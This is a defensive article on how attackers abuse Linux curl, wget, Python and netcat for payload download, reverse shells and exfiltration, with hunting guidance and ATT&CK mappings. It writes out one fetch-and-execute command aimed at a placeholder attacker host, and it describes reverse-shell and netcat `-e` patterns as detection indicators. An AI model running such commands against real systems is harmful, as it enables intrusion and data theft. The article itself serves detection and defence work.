# Living off the Land Binary Abuse on Linux — Curl, Wget, Python, and Netcat

## Overview

Living off the Land Binary abuse is not exclusive to Windows environments. Linux systems ship with a powerful set of native utilities that attackers routinely abuse to download payloads, execute malicious code, establish persistent access, and exfiltrate data — all through trusted binaries that are expected to be present and actively used in most enterprise Linux environments. This document covers three categories of commonly abused Linux utilities: the download tools curl and wget, the Python scripting runtime, and the network utility netcat and its variants.

Unlike Windows LOLBin abuse where the binaries are often invoked in unexpected contexts — Office applications spawning certutil, or regsvr32 loading remote scriptlets — Linux LOLBin abuse frequently blends into environments where these tools are genuinely used for legitimate purposes every day. Curl and wget are used constantly by administrators, developers, and automated processes to retrieve content from the internet. Python is deeply embedded in virtually every modern Linux system and is used for everything from system administration scripts to complex application logic. Netcat is a standard networking utility used for diagnostics, port scanning, and connectivity testing. This ubiquity makes detection more challenging and baselines more important than in almost any other detection domain.

---

## Why Attackers Abuse These Binaries

The Linux LOLBins covered in this document share several characteristics that make them attractive to attackers. Each is present by default or easily available on virtually every modern Linux distribution. Each carries no inherent signature of malicious intent — their execution is expected and unremarkable in most environments. And each provides capabilities that directly serve common attacker objectives without requiring the delivery, compilation, or execution of additional custom tooling.

Attackers who achieve initial access to a Linux system — whether through exploiting a web application, abusing SSH credentials, or gaining access through a misconfigured service — typically need to accomplish several things quickly: download additional tooling or payloads, establish a persistent or interactive foothold, and potentially exfiltrate sensitive data. Curl, wget, Python, and netcat collectively provide all of these capabilities through utilities that are already present and trusted on the compromised system.

The cloud and container security context also makes these utilities particularly significant. Linux underlies the vast majority of cloud workloads, containerized applications, and server infrastructure. An attacker who compromises a cloud workload or container instance has immediate access to these utilities and can abuse them to move laterally within cloud environments, access metadata services, or exfiltrate credentials and sensitive configuration data.

---

## Commonly Abused Binaries

The following represents a sampling of abuse techniques associated with these utilities as observed in security incidents and threat intelligence reporting. This is not an exhaustive list, as attacker tradecraft continues to evolve.

**curl and wget**

Curl and wget are command-line utilities for transferring data using various network protocols. They are among the most universally installed and actively used utilities on Linux systems, employed by administrators for file downloads, developers for API testing, and automated processes for package retrieval and system updates. Attackers abuse curl and wget primarily as download cradles — using them to retrieve malicious payloads, scripts, or additional tooling from attacker-controlled infrastructure after achieving initial access. A common pattern involves a one-liner that downloads and immediately pipes content to a shell interpreter for execution, such as `curl http://attacker.com/payload.sh | bash`, allowing an attacker to execute arbitrary code without ever writing a file to disk. Curl and wget are also abused for data exfiltration — sending sensitive files or credential material to attacker-controlled servers using HTTP POST requests or other supported protocols. Because both utilities are legitimately used for identical purposes in most environments, detection requires focus on the destination, the context of execution, and the parent process rather than the binary itself.

**python and python3**

Python is installed by default on virtually every modern Linux distribution and is deeply embedded in the Linux ecosystem as both a scripting language and a dependency for countless system tools and applications. Attackers abuse Python for several purposes. As a script execution engine, Python can execute arbitrary code delivered as command-line arguments using the `-c` flag, allowing attackers to run complex payloads without writing script files to disk. Python's extensive standard library includes networking, file system, cryptography, and subprocess capabilities that make it extremely versatile for post-exploitation activity. One of the most commonly observed Python abuse patterns is the reverse shell one-liner — a short Python command passed via the `-c` flag that establishes a network connection back to the attacker and spawns an interactive shell. Python is also frequently used to spawn interactive TTY shells from within limited shell environments, upgrade basic reverse shells into fully interactive sessions, and execute encoded or obfuscated payloads that evade string-based detection.

**nc, ncat, and netcat**

Netcat — available under various names including nc, ncat, and netcat depending on the distribution and version — is a networking utility that reads and writes data across network connections using TCP or UDP. It is used legitimately for network diagnostics, port scanning, connectivity testing, and file transfers between systems. Attackers abuse netcat extensively for establishing reverse shells — connections from the compromised system back to the attacker's infrastructure that provide interactive command execution. A reverse shell established through netcat requires no additional tooling on either end and can blend into network traffic that might otherwise appear to be legitimate connectivity testing. Netcat is also used for data exfiltration by piping sensitive file contents across a network connection, for port scanning during lateral movement reconnaissance, and as a listener on the attacker's infrastructure to receive connections from compromised systems. The availability of netcat variants with different feature sets — particularly ncat from the Nmap project which supports SSL encryption — means attackers can establish encrypted reverse shells that further evade network-based detection.

---

## The Operational Problem

Detection of Linux LOLBin abuse faces the same fundamental challenge as all living off the land detection — the binaries themselves are legitimate and their execution is expected. However, several characteristics of Linux environments add additional complexity.

Process telemetry visibility on Linux is inconsistent across enterprise environments. Unlike Windows where EDR solutions provide rich process creation telemetry out of the box, Linux endpoint telemetry coverage varies significantly depending on whether auditd is configured, whether an EDR agent is deployed and what events it captures, and whether the environment runs containerized workloads where process visibility may be limited to the container level.

The pipe-to-shell execution pattern — where curl or wget downloads content and pipes it directly to a shell interpreter — presents a particular detection challenge because no file is ever written to disk. Traditional file-based detection has no artifact to examine, and the malicious payload may exist only in memory during execution.

Baselines are essential but difficult to establish in environments where curl, wget, Python, and netcat are legitimately used constantly by administrators, developers, and automated processes. Effective detection requires understanding the expected parent processes, destination URLs, command-line argument patterns, and network destinations associated with legitimate usage in a given environment before attempting to identify anomalous activity.

---

## Detection Opportunities

The following represents a sampling of practical starting points for hunting and detecting abuse of these utilities — this is not an exhaustive list.

**Monitor for curl and wget piped to interpreters**

The combination of curl or wget with output piped to bash, sh, python, or other interpreters is a strong indicator of malicious payload execution. Monitoring for process creation events where curl or wget are invoked with arguments referencing unusual external domains or IP addresses — particularly combined with subprocess activity spawning shell interpreters — can surface this pattern.

**Detect Python executing code via command-line arguments**

Python invocations using the `-c` flag to execute inline code are commonly associated with reverse shells and payload execution. Monitoring for python or python3 process creation events where the command line contains `-c` followed by code referencing socket, subprocess, os, or pty modules is a strong indicator of malicious activity.

**Hunt for netcat reverse shell patterns**

Netcat invocations referencing the `-e` flag — which executes a program after establishing a connection — are a classic reverse shell indicator. Also monitor for netcat invocations connecting to unusual external IP addresses or ports, and for netcat being spawned by web server processes, database processes, or other services that would not normally initiate outbound network connections.

**Identify anomalous parent process relationships**

The parent process of these utilities provides significant triage context. Curl, wget, Python, or netcat spawned by web server processes such as apache2, nginx, or tomcat may indicate exploitation of a web application vulnerability. These utilities spawned by cron jobs, database processes, or other services outside of normal administrative workflows also warrant investigation.

**Correlate with network connections**

Process creation events for these utilities should be correlated with network connection telemetry where available. Outbound connections to unusual external IP addresses or domains — particularly to non-standard ports or destinations not associated with approved administrative or application traffic — can confirm malicious intent when observed alongside suspicious process creation activity.

---

## MITRE ATT&CK Mapping

- **T1105** — Ingress Tool Transfer
- **T1059.006** — Command and Scripting Interpreter: Python
- **T1059.004** — Command and Scripting Interpreter: Unix Shell
- **T1071.001** — Application Layer Protocol: Web Protocols
- **T1048.003** — Exfiltration Over Alternative Protocol
- **T1049** — System Network Connections Discovery
- **T1046** — Network Service Discovery

---

## Sources

- https://attack.mitre.org/techniques/T1105/
- https://attack.mitre.org/techniques/T1059/006/
- https://attack.mitre.org/techniques/T1059/004/
- https://gtfobins.github.io/
- https://redcanary.com/threat-detection-report/techniques/
- https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a
